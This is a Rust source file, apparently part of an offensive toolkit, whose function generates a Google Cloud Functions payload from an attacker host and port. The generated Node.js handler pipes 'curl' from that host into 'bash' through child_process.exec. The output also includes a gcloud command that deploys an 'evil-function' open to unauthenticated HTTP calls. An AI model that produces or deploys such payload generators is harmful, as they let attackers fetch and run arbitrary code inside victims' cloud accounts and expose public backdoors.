// GCP Cloud Functions payload generator
use crate::cli::banner;

pub struct GcpGenerator;

impl GcpGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str) -> String {
        banner::print_exploiting("GCP-PAYLOAD", &format!("{}:{}", lhost, lport));
        
        format!(
            r#"exports.handler = function(event, context, callback) {{
  const https = require('https');
  const payload = 'curl -s http://{}:{}/payload.sh | bash';
  require('child_process').exec(payload, (error, stdout, stderr) => {{
    callback(error, stdout, stderr);
  }});
}};

gcloud functions deploy evil-function --runtime nodejs14 --trigger-http --allow-unauthenticated"#,
            lhost, lport
        )
    }
}
